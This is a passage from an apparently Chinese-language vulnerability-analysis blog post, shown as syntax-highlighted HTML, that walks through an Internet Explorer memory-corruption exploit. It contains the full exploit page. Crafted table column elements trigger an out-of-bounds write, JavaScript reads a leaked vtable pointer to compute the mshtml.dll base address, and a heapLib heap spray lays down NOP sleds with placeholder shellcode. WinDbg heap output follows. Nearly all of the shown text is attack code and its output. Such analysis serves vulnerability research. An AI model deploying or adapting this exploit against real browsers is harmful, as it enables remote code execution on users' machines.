class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"89"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"90"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"91"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"92"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"93"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"94"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"95"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"96"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"97"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"98"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"99"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"100"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"101"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"102"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"103"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"104"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"105"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"106"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"107"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"108"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"109"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"110"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"111"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"112"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"113"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"114"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"115"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"116"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"117"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"118"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"119"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"120"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"121"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"122"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"123"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"124"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"125"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"126"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"127"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"128"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"129"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"130"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"131"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> mshtmlbase;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> leak_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span></span><br><span class="line"><span class="undefined">            leak_col.width = 41;</span></span><br><span class="line"><span class="undefined">            leak_col.span = 19;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">get_leak</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (al[i].length &gt; (<span class="number">0x100</span> - <span class="number">6</span>) / <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> leak = al[i].substring((<span class="number">0x100</span> - <span class="number">6</span>) / <span class="number">2</span> + (<span class="number">2</span> + <span class="number">8</span>) / <span class="number">2</span>, (<span class="number">0x100</span> - <span class="number">6</span>) / <span class="number">2</span> + (<span class="number">2</span> + <span class="number">8</span> + <span class="number">4</span>) / <span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">                    leak_addr = <span class="built_in">parseInt</span>(leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="comment">//alert("CbuttonLayout虚表指针: 0x" + leak_addr.toString(16));</span></span></span><br><span class="line"><span class="undefined">                    mshtmlbase = leak_addr - 0x173af8;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">//alert("mshtml.dll基址?: 0x" + mshtmlbase.toString(16));</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">heap_spray</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">"spray..."</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> heap_obj = <span class="keyword">new</span> heapLib.ie(<span class="number">0x10000</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> code = <span class="built_in">unescape</span>(<span class="string">"%ucccc%ucccc"</span>);    <span class="comment">//Code to execute</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> nops = <span class="built_in">unescape</span>(<span class="string">"%u9090%u9090"</span>);    <span class="comment">//NOPs</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">while</span> (nops.length &lt; <span class="number">0x1000</span>) nops+= nops; <span class="comment">// create big block of nops</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> shellcode =  nops.substring(<span class="number">0</span>,<span class="number">0x800</span> - code.length) + code;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">while</span> (shellcode.length &lt; <span class="number">0x40000</span>) shellcode += shellcode;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> block = shellcode.substring(<span class="number">2</span>, <span class="number">0x40000</span> - <span class="number">0x21</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">//spray</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;</span></span><br><span class="line"><span class="undefined">                heap_obj.alloc(block);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">"done"</span>)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="string">"leak();"</span>, <span class="number">400</span>);</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="string">"get_leak()"</span>, <span class="number">450</span>);</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="string">"heap_spray();"</span>, <span class="number">500</span>)</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><p>在喷射完成后，查看内存情况<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; !address -f:heap</span><br><span class="line">                                     </span><br><span class="line">Mapping file section regions...</span><br><span class="line">Mapping module regions...</span><br><span class="line">Mapping PEB regions...</span><br><span class="line">Mapping TEB and stack regions...</span><br><span class="line">Mapping heap regions...</span><br><span class="line">Mapping page heap regions...</span><br><span class="line">Mapping other regions...</span><br><span class="line">Mapping stack trace database regions...</span><br><span class="line">Mapping activation context regions...</span><br><span class="line"></span><br><span class="line">  BaseAddr EndAddr+1 RgnSize     Type       State                 Protect             Usage</span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line">   10000    20000    10000 MEM_MAPPED  MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 1; Handle: 00010000; Type: Segment]</span><br><span class="line">   e0000   1e0000   100000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Segment]</span><br><span class="line">  4b0000   4c0000    10000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 2; Handle: 004b0000; Type: Segment]</span><br><span class="line"> 1b90000  1bb9000    29000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 3; Handle: 01b90000; Type: Segment]</span><br><span class="line"> 1bb9000  1bd0000    17000 MEM_PRIVATE MEM_RESERVE                                    Heap       [ID: 3; Handle: 01b90000; Type: Segment]</span><br><span class="line"> 1ec0000  1ec8000     8000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 4; Handle: 01ec0000; Type: Segment]</span><br><span class="line"> 1ec8000  1f00000    38000 MEM_PRIVATE MEM_RESERVE                                    Heap       [ID: 4; Handle: 01ec0000; Type: Segment]</span><br><span class="line"> 2170000  21bc000    4c000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 2; Handle: 004b0000; Type: Segment]</span><br><span class="line"> 21bc000  2270000    b4000 MEM_PRIVATE MEM_RESERVE                                    Heap       [ID: 2; Handle: 004b0000; Type: Segment]</span><br><span class="line"> 2be0000  2be1000     1000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 5; Handle: 02be0000; Type: Segment]</span><br><span class="line"> 2be1000  2c20000    3f000 MEM_PRIVATE MEM_RESERVE                                    Heap       [ID: 5; Handle: 02be0000; Type: Segment]</span><br><span class="line"> 2cb0000  2cdb000    2b000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 6; Handle: 02cb0000; Type: Segment]</span><br><span class="line"> 2cdb000  2cf0000    15000 MEM_PRIVATE MEM_RESERVE                                    Heap       [ID: 6; Handle: 02cb0000; Type: Segment]</span><br><span class="line"> 2e00000  2f00000   100000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Segment]</span><br><span class="line"> 3010000  30e2000    d2000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Segment]</span><br><span class="line"> 30e2000  3210000   12e000 MEM_PRIVATE MEM_RESERVE                                    Heap       [ID: 0; Handle: 000e0000; Type: Segment]</span><br><span class="line"> 35b0000  3631000    81000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 3760000  37e0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 37e0000  3860000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 3960000  39e0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 39e0000  3a60000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 3a60000  3ae0000    80000 